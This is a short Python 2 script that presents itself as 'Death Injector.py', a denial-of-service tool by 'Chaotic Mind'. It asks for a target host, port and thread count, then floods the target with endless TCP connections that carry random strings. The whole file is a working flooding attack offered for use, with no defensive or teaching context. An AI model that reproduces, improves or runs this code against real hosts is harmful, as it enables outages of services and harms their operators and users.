# -*- coding: utf-8 -*-
import socket, random, threading
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
i=0
def k():
 global i
 i+=1
 print'injections:',i
 
def c(size):
    global str
    str = ''
    for i in range(0, size):
        a = random.randint(65, 160)
        str += chr(a)
    return(str)

def s():
 global li
 li=[]
 for l in range(10000):
  n=c(random.randint(5,15))
  li.append(n)
 return li
print"""\033[92m

  ################################
  
     hello there and welcome!!!
  this is Chaotic Mind's property 
  so expect an exciting experience 
  for you with this Dos tool


  Tool:
      Death Injector.py
      
  Author:
      Chaotic Mind 
      
      
  enjoy!!!!
  
  ################################  """

print '\n\n      [+]generating random strings....'
s()
print '\n\n      [+]done!!!'
u=raw_input('\n\n      TARGET:\n      (www.example.com or IP)\n      >')
p=input('\n      PORT:\n      >')
b=input('\n      USE THREADS?\n       1-yes\n       2-no\n      >')
if b==1:
 y=input('\n      THREADS:\n      >')
else:
 pass
 
def a():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(3)
 s.connect((u,p))
 try:
  s.settimeout(.01)
  while True:
   s.send(random.choice(li))
 except socket.error as e:
  k()
			 
class SOCKETThread(threading.Thread):
	def run(self):
		try:
			while True:
			 try:
				 a()
			 except socket.error:
			  pass
		except Exception, ex:
			pass
if b==1:
 for x in range(y):
  t = SOCKETThread()
  t.start()
else:
 while True:
  try:
   a()
  except socket.error:
   pass

